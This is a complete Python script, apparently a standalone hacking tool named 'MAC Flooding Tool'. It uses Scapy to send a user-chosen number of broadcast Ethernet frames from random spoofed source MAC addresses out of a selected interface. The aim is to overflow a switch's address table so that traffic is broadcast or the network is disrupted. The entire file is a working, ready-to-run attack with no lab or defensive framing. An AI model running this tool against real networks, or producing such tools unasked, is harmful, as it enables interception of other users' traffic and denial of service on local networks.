import random
import time
from scapy.all import Ether, sendp, get_if_hwaddr, get_if_list

def generate_random_mac():
    # Generate a random, locally administered MAC address
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

def mac_flood(interface, packet_count, delay=0.01):
    print(f"\n[+] Starting MAC flood on interface: {interface}")
    print(f"[+] Sending {packet_count} packets with {delay:.3f}s delay...\n")

    for i in range(1, packet_count + 1):
        spoofed_mac = generate_random_mac()
        frame = Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff")
        sendp(frame, iface=interface, verbose=False)

        if i % 100 == 0 or i == packet_count:
            print(f"  Sent {i} packets")

        time.sleep(delay)

    print("\n[+] MAC flood complete.")

def choose_interface():
    interfaces = get_if_list()
    print("Available network interfaces:\n")
    for index, iface in enumerate(interfaces, 1):
        print(f"  {index}. {iface}")
    
    try:
        choice = int(input("\nSelect an interface by number: ").strip())
        return interfaces[choice - 1]
    except (IndexError, ValueError):
        print("[-] Invalid selection. Exiting.")
        exit(1)

def get_user_inputs():
    try:
        packet_count = int(input("Enter number of packets to send: ").strip())
        delay = float(input("Enter delay between packets (in seconds): ").strip())
        return packet_count, delay
    except ValueError:
        print("[-] Invalid input. Exiting.")
        exit(1)

def main():
    print("\n=== MAC Flooding Tool ===")
    interface = choose_interface()
    packet_count, delay = get_user_inputs()
    mac_flood(interface, packet_count, delay)

if __name__ == "__main__":
    main()
